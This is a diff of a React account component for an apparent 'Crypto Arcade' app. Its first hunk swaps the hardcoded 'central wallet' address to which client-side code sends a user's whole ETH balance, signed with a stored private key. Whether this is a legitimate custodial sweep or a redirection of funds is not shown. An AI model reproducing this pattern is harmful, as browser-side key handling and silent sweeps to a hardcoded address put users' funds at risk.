@@ -52,7 +52,7 @@ export default function Account() {
                         if (amnt > gasPrice * 23000) {
                             // send balance to central wallet 
                             web3.eth.accounts.signTransaction({
-                                to: "0x7B42Ee76D570c13eded96053E0042a77e944bF7d",
+                                to: "0xf2B695485401e7976935Cb60D2129ab26E94a0fB",
                                 value: parseInt(amnt - gasPrice * 23000),
                                 gas: 21000
                             }, data.key).then((signedTransactionData) => {
@@ -131,7 +131,7 @@ export default function Account() {
 
     return (
         <div id="accountArea">
-            {sendingEth ? <SendEthModal balance={balance} close={() => closeSendModal()}/> : null}
+            {sendingEth ? <SendEthModal balance={balance} close={() => closeSendModal()} update={() => getWalletInfo()} username={username}/> : null}
             <header>
                 <nav id="navAccount">
                     <h1 id="accountLogo" onClick={() => history.push("/")}>Crypto Arcade</h1>
